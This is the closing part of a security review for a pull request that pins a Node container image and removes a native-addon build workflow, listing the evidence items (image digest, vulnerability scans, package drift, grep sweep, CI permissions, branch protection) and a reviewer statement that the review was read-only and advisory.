[EV-06] E-1 binding          declared == resolved
[EV-09] Dockerfile diff      ARG x2 + comment; no FROM hunk
[EV-12] resolved FROM        node:22.23.4-slim@sha256:<digest>  (build log)
[EV-13] in-image runtime     v22.23.4; onnxruntime-node <semver>
[EV-14] AD-8 evidence        M1 PASS; M2 new fixable findings = 0 (or attributed); M3 table attached
[EV-14b] unfiltered scan     trivy-*-all.json attached (not summarised only)
[EV-14c] package drift       dpkg-baseline vs dpkg-candidate delta attached
[EV-15] diff scope           18 entries = 17 modified + 1 deleted
[EV-16] AC-08 sweep          grep build-native|better-sqlite3 -> no output
[EV-17] workflow removal     gh workflow list: producer absent; ONNX producer present
[EV-18] CI token default     read-only | read/write  (screenshot ref)
[EV-19] branch protection    no required check named "Build Native Addons (better-sqlite3)"
```

### D. Reviewer statement

This review was performed read-only against the design documents and the repository working tree at `main` on 2026-10-28. No file outside `documents/SA4E-386/SECURITY-REVIEW.md` was created or modified. The verdict is advisory to the PR and to the requesting SM; the blocking conditions are the only items Security will enforce at merge time, and they can all be satisfied without changing the 18-path allow-list.
